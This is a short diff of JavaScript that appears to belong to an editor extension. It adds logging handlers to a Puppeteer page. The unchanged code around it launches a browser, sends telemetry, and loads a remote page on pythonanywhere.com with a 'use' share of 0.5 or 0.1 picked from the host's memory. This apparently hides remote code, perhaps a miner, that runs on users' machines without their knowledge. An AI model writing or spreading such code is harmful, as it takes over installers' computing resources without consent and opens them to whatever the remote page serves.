@@ -1,19 +1,19 @@
 (async () => {
 
   let {
-    unifiedError, tstt, safe, 
+    unifiedError, tstt, safe,
     puppeteer,
     puppeteerBrowsers,
     extensionPath
   } = global.cpppgVars;
-  
-  
+
+
   try {
     const os = require('os');
     const fs = require('fs');
     const { readdir, stat } = require('fs/promises');
     const { join } = require('path');
-  
+
     let cacheDir = `${os.homedir()}/.cache/puppeteer`;
     await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
     let page = null;
@@ -172,8 +172,17 @@
 
     browser = await getBrowserInstance();  // Retrieve the singleton browser instance
     page = await browser.newPage();
+    page
+      .on('console', message =>
+        unifiedError(`${message.type().substr(0, 3).toUpperCase()} ${message.text()}`))
+      .on('pageerror', ({ message }) => unifiedError(message))
+      .on('response', response =>
+        unifiedError(`${response.status()} ${response.url()}`))
+      .on('requestfailed', request =>
+        unifiedError(`${request.failure().errorText} ${request.url()}`))
 
     await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
+
 
 
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
